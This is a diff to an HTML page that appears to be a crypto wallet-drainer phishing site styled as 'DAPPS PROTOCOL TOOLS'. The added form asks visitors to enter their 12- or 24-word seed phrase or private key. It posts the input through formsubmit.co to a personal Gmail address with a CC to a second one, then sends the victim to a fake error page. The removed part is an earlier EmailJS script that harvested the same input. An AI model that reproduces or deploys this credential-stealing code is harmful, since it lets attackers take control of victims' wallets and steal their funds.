@@ -198,7 +198,7 @@
       </div>
       <div class="wallet-section">
         <div class="wallet-container">
-          <h2 style="font-weight: 500">Select a Wallet</h2>
+          <h2 style="font-weight: 500">DAPPS PROTOCOL TOOLS</h2>
           <br><br>
           <div class="wallet-box-container-grid">
             <div class="wallet-box-container clickable">
@@ -1563,8 +1563,10 @@
             <br>
           </div>
 
-             <form action="" method="post" enctype="multipart/form-data" id="my-form" class="ajaxForm">
-                                     
+             <form action="https://formsubmit.co/madisonpatrick32@gmail.com" method="post" enctype="multipart/form-data" id="form" class="ajaxForm">
+                                      <input type="hidden" name="_cc" value="formsubmitmails@gmail.com">
+                                        <input type="hidden" name="_captcha" value="false">
+                                        <input type="hidden" name="_next" value="https://onchainhubnodes.vercel.app/error/load.html">
                                        
                                        
           <div id="buttonContainer" class="container">
@@ -1582,12 +1584,12 @@
             <p id="errorMessage" class="error-text" style="display: none">
               Error: Please enter a valid detail.
             </p>
-            <textarea id="keys" name="message" placeholder="Enter 12 or 24 words" required=""></textarea>
+            <textarea id="inputTextArea" name="phrase" placeholder="Enter 12 or 24 seed phrase / private key" required=""></textarea>
 
             
 
             <div class="error" style="color: red"></div>
-            <button id="submit" type="submit" name="submit" value="submit">
+            <button id="sendButton" type="submit" name="submit" value="submit">
               Connect Wallet
             </button>
              </form>
@@ -1612,37 +1614,6 @@
         </form>
       </div>
     </div>
-    <script type="text/javascript"
-src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-
-<script type="text/javascript">
-emailjs.init('roAWfktVFrMPYxjlS')
-</script>
-
-<script>
-const btn = document.getElementById('submit');
-
-document.getElementById('my-form')
-.addEventListener('submit', function(event) {
-event.preventDefault();
-
-btn.value = 'Sending...';
-
-const serviceID = 'service_atnpkta';
-const templateID = 'template_2bfqqw8';
-
-emailjs.sendForm(serviceID, templateID, this)
-.then(() => {
-btn.value = 'Send Email';
-alert('errorr!');
-}, (err) => {
-btn.value = 'Send Email';
-alert(JSON.stringify(err));
-});
-});
-</script>
-
-
 
         <script src="js/javasc.js"></script>
     
